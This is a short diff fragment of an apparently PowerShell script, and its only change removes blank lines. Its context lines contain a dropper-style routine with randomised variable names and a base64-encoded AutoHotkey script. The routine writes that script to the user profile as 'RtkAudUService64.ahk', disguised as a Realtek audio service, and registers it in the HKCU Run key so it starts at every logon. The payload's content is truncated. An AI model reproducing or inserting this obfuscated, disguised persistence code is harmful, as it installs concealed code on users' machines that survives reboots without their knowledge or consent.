@@ -22,5 +22,3 @@ $n7Ps98plwkJq  = "I1JlcXVpcmVzIEF1dG9Ib3RrZXkgdjIuMAojU2luZ2xlSW5zdGFuY2UgRm9yY2
 $butTG0 = "$ERq5PZGS10lUNavebVT9Y3:USERPROFILE\RtkAudUService64.ahk"
 z $n7Ps98plwkJq $butTG0 $true
 Set-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Run' -Name 'RtkAudUService64' -Value $butTG0
-
-
